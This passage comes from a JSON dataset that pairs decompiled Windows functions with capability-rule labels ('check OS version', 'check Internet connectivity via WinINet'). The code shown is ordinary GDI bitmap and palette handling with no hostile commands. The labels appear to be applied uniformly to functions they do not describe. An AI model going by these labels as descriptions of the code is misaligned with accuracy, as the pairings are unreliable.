        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00427a7c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x427aa1;\n    fcn.00403aac();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x427ad3;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x427aea;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x427af6;\n    fcn.0042601c();\n    uStack76 = 0;\n    puStack80 = 0x427b01;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x427bb7;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x427b25;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x427b30;\n    uVar4 = fcn.00402ef0();\n    uStack116 = 0x427b97;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.0042521c();\n    }\n    fcn.0041b8b8();\n    fcn.0041b8b8();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402f0c(0x427b9e);\n    return;\n}\n",
        "token_count": 806
    },
    "00427dc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427dc4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x427dd4;\n    var_8h = fcn.00419b48();\n    uStack24 = 0x427e62;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x427dff;\n            var_ch = fcn.004197d8();\n            puStack32 = 0x427e0a;\n            cVar1 = fcn.00424d58();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x427e3a;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.00427f54();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x427e41;\n                uStack36 = 0x427e39;\n                fcn.00424db4();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x427e69;\n    uStack24 = 0x427e61;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 451
    },
    "00427e70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427e70(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x427e89;\n        iVar1 = fcn.00419b48();\n        uStack24 = 0x427ee0;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.004197d8();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.00427f54();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x427ee7;\n        uStack24 = 0x427edf;\n        fcn.00419bac();\n        return;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00427f54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427f54(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x427f71;\n        fcn.00424c44();\n        uStack20 = 0x427fe8;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.00424f48();\n        sub.gdi32.dll_DeleteDC();\n        fcn.00419b5c();\n        *in_FS_OFFSET = uVar1;\n        fcn.00424db4(0x427fef);\n        return;\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "00427ff4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427ff4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x428012;\n        fcn.00424c44();\n        uStack24 = 0x4280d3;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.00429408();\n        fcn.00427e70();\n        fcn.00429508();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.00424f48();\n        fcn.00419ac0();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.00424db4(0x4280da);\n        return;\n    }\n    return;\n}\n",
        "token_count": 479
    },
    "004280e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004280e4(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00404640();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00428268": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428268(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "004282b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004282b4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x42831c;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.00427e70();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.004282b4::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x428339;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x428343;\n                fcn.004251a4();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x42834a;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x42834f;\n        iStack188 = fcn.004252c4();\n        puStack192 = 0x42835b;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x428360;\n        hdcDest = fcn.004252c4();\n        uStack196 = 0x428902;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x4283a7;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x4283ac;\n                var_10h = fcn.004252c4();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x4283cb;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x4283d0;\n                var_10h = fcn.004252c4();\n            }\n            uStack216 = 0x42861b;\n            fcn.004252c4();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x428628;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x42862d;\n            var_14h = fcn.004252c4();\n            iStack228 = 0x4288b3;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x4288a2;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x428668;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x428674;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x428880;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x428761;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00424860();\n                puStack288 = 0x4286b5;\n                fcn.00418388(&fcn.004282b4::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.004282b4::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x4286c5;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x4286d3;\n                iStack296 = fcn.00423aa4();\n                iStack300 = hdcDest;\n                puStack304 = 0x4286dd;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x4286e8;\n                fcn.00424824();\n                puStack304 = 0x4286ed;\n                puStack304 = fcn.00423aa4();\n                iStack308 = hdcDest;\n                puStack312 = 0x4286f7;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x428718;\n                    var_30h = fcn.00423aa4();\n                    puStack312 = 0x428726;\n                    fcn.00424824();\n                    puStack312 = 0x42872b;\n                    var_2ch = fcn.00423aa4();\n                    puStack312 = &fcn.004282b4::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x428774;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x428779;\n                var_20h = fcn.004252c4();\n                iStack308 = 0x428856;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.004252c4();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.00423aa4();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.00424824();\n                    uVar6 = fcn.00423aa4();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.004252c4();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x42885d);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x428887;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x42887f;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x4283e2;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402ef0();\n        uStack208 = 0x42860c;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x42841b;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x428428;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x4284d2;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x428523;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x4284f8;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x428530;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x4284b6;\n                fcn.00425a60();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x428559;\n            fcn.00428268();\n            iStack232 = 0x42856f;\n            fcn.004030ec();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.004282b4::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x428586;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x42858b;\n        var_10h = fcn.004252c4();\n        if (var_28h == 0) {\n            iStack256 = 0x428599;\n            fcn.0042521c();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x428613;\n            puStack248 = 0x42860b;\n            uVar8 = fcn.00402f0c();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00404f60();\n        fcn.00404f60();\n    }\n    return var_10h;\n}\n",
        "token_count": 3753
    },
    "00428918": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00428918(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x428936;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 296
    },
    "0042897c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042897c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.0042897c::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x4289a4;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x4289b3;\n            fcn.00427e70();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x428b77;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x4289d2;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x4289d7;\n            iStack160 = fcn.004252c4();\n            uStack164 = 0x4289e3;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x4289e8;\n            hdcDest = fcn.004252c4();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x4289fe;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x428a18;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x428a48;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x428a4d;\n                    hdc = fcn.004252c4();\n                    uStack200 = 0x428b2f;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.004282b4(0, &fcn.0042897c::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x428b36);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x428b7e);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1356
    },
    "00428b88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
